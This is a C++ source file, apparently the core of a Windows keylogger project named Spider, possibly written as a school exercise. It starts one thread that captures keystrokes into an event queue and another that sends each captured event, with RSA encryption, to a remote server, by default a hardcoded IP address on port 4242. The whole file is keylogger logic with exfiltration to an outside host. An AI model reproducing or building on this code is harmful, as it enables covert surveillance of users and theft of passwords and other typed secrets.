//!
//! \file Spider.cpp
//! \author jbruel
//! \date 30/09/2017
//!

#define WIN32_LEAN_AND_MEAN
#include <SDKDDKVer.h>
#include <iostream>
#include <thread>
#include "Exception/CoreException.hpp"
#include "Core/Spider.hpp"
#include "Event/EventQueue.hpp"
#include "Event/EventHandler.hpp"
#include "Core/KeyReader.hpp"
#include "ssl/RSAKeys.hpp"

namespace Spider
{
namespace Core
{
	Spider::Spider() {}

	void	Spider::run(int argc, const char *const *argv)
	{
		std::shared_ptr<Event::EventQueue>	queue(new Event::EventQueue);
		std::thread		keyLogger(Spider::keyLogger, queue.get());
		std::thread		network(Spider::network, queue.get(), argc, argv);

		keyLogger.join();
		network.join();
	}

	void	Spider::keyLogger(Event::EventQueue *queue)
	{
		KeyReader	keyReader;

		try {
			while (true)
				keyReader.read(queue);
		}
		catch (CoreException &exception) {
			queue->changeStatus();
			throw CoreException("The Keylogger as ended: " + std::string(exception.what()));
		}
	}

	void	Spider::network(Event::EventQueue *queue, int argc, const char *const *argv)
	{
		int port = ((argc > 3) ? std::atoi(argv[2]) : 4242);
		std::string ip = ((argc > 2) ? argv[1] : "212.198.179.204");

		Event::EventHandler	handler(ip, port);
		ssl::RSAKeys	rsa;

		rsa.generate();
		while (42)
		{
			if (!queue->isSet())
				throw CoreException("Notice: The Keylogger as ended.");

			std::shared_ptr<Event::IEvent>	event;

			if ((queue->get(event)))
			{
				queue->pop();
				handler.handle(event, rsa);
			}
		}
	}
}
}